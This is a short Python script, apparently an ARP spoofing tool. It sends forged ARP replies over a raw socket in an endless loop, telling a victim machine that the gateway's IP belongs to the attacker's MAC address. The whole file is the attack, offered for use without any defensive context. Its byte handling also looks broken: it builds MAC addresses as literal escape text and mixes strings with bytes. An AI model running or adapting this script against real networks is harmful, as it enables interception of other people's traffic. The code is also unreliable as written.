import socket
import struct
import binascii
import sys
   

attckrmac = sys.argv[1]
victimmac = sys.argv[2]
gateway_ip = sys.argv[3]
victim_ip = sys.argv[4]

attckrmac = "\\x"+attckrmac.replace(":","\\x")
victimmac = "\\x"+victimmac.replace(":","\\x")

print(attckrmac+" "+victimmac)

s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
s.bind(("enp0s3",socket.htons(0x0800)))

#ARP packet header items

# attckrmac = '\x08\x00\x27\xd1\x34\x86'
# victimmac = '\x6c\x3b\x6b\x36\x3b\x98'

ethertype ='\x08\x06' #protocol type for Ethernet
#ethernet frame(dest mac+src mac+ethertype+payload)
ethernet1 = victimmac + attckrmac + ethertype

htype = '\x00\x01' #hardware type
protype = '\x08\x00' #protocol type for IPv4
hsize = '\x06' #hardware address length
psize = '\x04' #protocol address length
opcode = '\x00\x02' #code for ARP reply

# gateway_ip = ' 172.20.58.6'
# victim_ip = ' 172.20.60.1'

gatewayip = socket.inet_aton(gateway_ip)
victimip = socket.inet_aton(victim_ip)

victim_ARP = ethernet1 + htype + protype + hsize + psize + opcode + attckrmac + gatewayip + victimmac + victimip
# #gateway_ARP = ethernet2 + htype + protype + hsize + psize +opcode + attckmac + victimip + gatewaymac + gatewayip

arp_no = 0
while 1:
   s.send(victim_ARP)
   print("ARP "+str(arp_no)+" sent")
   arp_no = arp_no + 1
#    #s.send(gateway_ARP)